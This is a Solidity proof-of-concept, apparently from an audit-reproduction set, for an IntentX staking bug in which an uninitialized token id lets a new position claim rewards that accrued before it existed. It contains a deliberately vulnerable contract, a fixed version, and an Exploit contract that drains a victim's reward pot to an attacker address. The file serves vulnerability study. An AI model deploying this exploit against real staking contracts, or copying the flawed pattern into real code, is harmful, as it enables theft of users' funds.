// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

/*
 * AuditVault 59428 — IntentX StakedINTX._stake (Quantstamp).
 * _tokenId is declared and passed to _updateReward before it is assigned, so the
 * call updates token id 0. The newly minted xINTX position keeps rewardDebt 0
 * and later claims the rewards that accrued before it existed.
 */

contract MiniERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract StakedINTX {
    MiniERC20 public stakeToken;
    MiniERC20 public rewardToken;
    uint256 public lastTokenId;
    uint256 public accRewardPerToken;
    uint256 public totalStaked;
    uint256 public updates;

    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public staked;
    mapping(uint256 => uint256) public rewardDebt;
    mapping(uint256 => uint256) public rewards;

    constructor(MiniERC20 _stake, MiniERC20 _reward) {
        stakeToken = _stake;
        rewardToken = _reward;
    }

    function _updateReward(uint256 tokenId) internal {
        updates += 1; // @> VULN:
        uint256 accumulated = (staked[tokenId] * accRewardPerToken) / 1e18;
        if (accumulated > rewardDebt[tokenId]) {
            rewards[tokenId] += accumulated - rewardDebt[tokenId];
        }
        rewardDebt[tokenId] = accumulated;
    }

    function _stake(address who, uint256 amount) internal returns (uint256) {
        uint256 _tokenId;
        // uninitialized, so the update above settles token id 0
        _updateReward(_tokenId);
        _tokenId = ++lastTokenId;
        ownerOf[_tokenId] = who;
        staked[_tokenId] = amount;
        totalStaked += amount;
        stakeToken.transferFrom(who, address(this), amount);
        return _tokenId;
    }

    function stake(uint256 amount) external returns (uint256) {
        return _stake(msg.sender, amount);
    }

    function notifyReward(uint256 reward) external {
        rewardToken.transferFrom(msg.sender, address(this), reward);
        accRewardPerToken += (reward * 1e18) / totalStaked;
    }

    function claim(uint256 tokenId) external {
        _updateReward(tokenId);
        uint256 amt = rewards[tokenId];
        rewards[tokenId] = 0;
        rewardDebt[tokenId] = (staked[tokenId] * accRewardPerToken) / 1e18;
        if (amt > 0) rewardToken.transfer(ownerOf[tokenId], amt);
    }
}

contract StakedINTXFixed {
    MiniERC20 public stakeToken;
    MiniERC20 public rewardToken;
    uint256 public lastTokenId;
    uint256 public accRewardPerToken;
    uint256 public totalStaked;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public staked;
    mapping(uint256 => uint256) public rewardDebt;
    mapping(uint256 => uint256) public rewards;

    constructor(MiniERC20 _stake, MiniERC20 _reward) {
        stakeToken = _stake;
        rewardToken = _reward;
    }

    function _updateReward(uint256 tokenId) internal {
        uint256 accumulated = (staked[tokenId] * accRewardPerToken) / 1e18;
        if (accumulated > rewardDebt[tokenId]) rewards[tokenId] += accumulated - rewardDebt[tokenId];
        rewardDebt[tokenId] = accumulated;
    }

    function stake(uint256 amount) external returns (uint256 tokenId) {
        tokenId = ++lastTokenId;
        ownerOf[tokenId] = msg.sender;
        staked[tokenId] = amount;
        totalStaked += amount;
        rewardDebt[tokenId] = (amount * accRewardPerToken) / 1e18;
        stakeToken.transferFrom(msg.sender, address(this), amount);
    }

    function notifyReward(uint256 reward) external {
        rewardToken.transferFrom(msg.sender, address(this), reward);
        accRewardPerToken += (reward * 1e18) / totalStaked;
    }

    function claim(uint256 tokenId) external {
        _updateReward(tokenId);
        uint256 amt = rewards[tokenId];
        rewards[tokenId] = 0;
        rewardDebt[tokenId] = (staked[tokenId] * accRewardPerToken) / 1e18;
        if (amt > 0) rewardToken.transfer(ownerOf[tokenId], amt);
    }
}

contract VictimStaker {
    function approveAndStake(MiniERC20 token, StakedINTX staking, uint256 amount) external returns (uint256) {
        token.approve(address(staking), amount);
        return staking.stake(amount);
    }

    function approveAndStakeFixed(MiniERC20 token, StakedINTXFixed staking, uint256 amount) external returns (uint256) {
        token.approve(address(staking), amount);
        return staking.stake(amount);
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 internal constant STAKE_AMT = 100 ether;
    uint256 internal constant REWARD = 1_000 ether;

    MiniERC20 public stakeToken;
    MiniERC20 public rewardToken;
    StakedINTX public staking;
    VictimStaker public victim;
    uint256 public victimId;
    uint256 public attackerId;
    uint256 public stolen;

    function run() external {
        stakeToken = new MiniERC20("INTX", "INTX");
        rewardToken = new MiniERC20("rINTX", "rINTX");
        staking = new StakedINTX(stakeToken, rewardToken);
        victim = new VictimStaker();

        stakeToken.mint(address(victim), STAKE_AMT);
        victimId = victim.approveAndStake(stakeToken, staking, STAKE_AMT);

        rewardToken.mint(address(this), REWARD);
        rewardToken.approve(address(staking), REWARD);
        staking.notifyReward(REWARD);

        stakeToken.mint(address(this), STAKE_AMT);
        stakeToken.approve(address(staking), STAKE_AMT);
        attackerId = staking.stake(STAKE_AMT);
        require(attackerId == 2, "id");
        require(staking.rewardDebt(attackerId) == 0, "debt");

        staking.claim(attackerId);
        stolen = rewardToken.balanceOf(address(this));
        require(stolen == REWARD, "stolen");
        require(rewardToken.balanceOf(address(staking)) == 0, "pot empty");
        rewardToken.transfer(ATTACKER, stolen);
    }
}
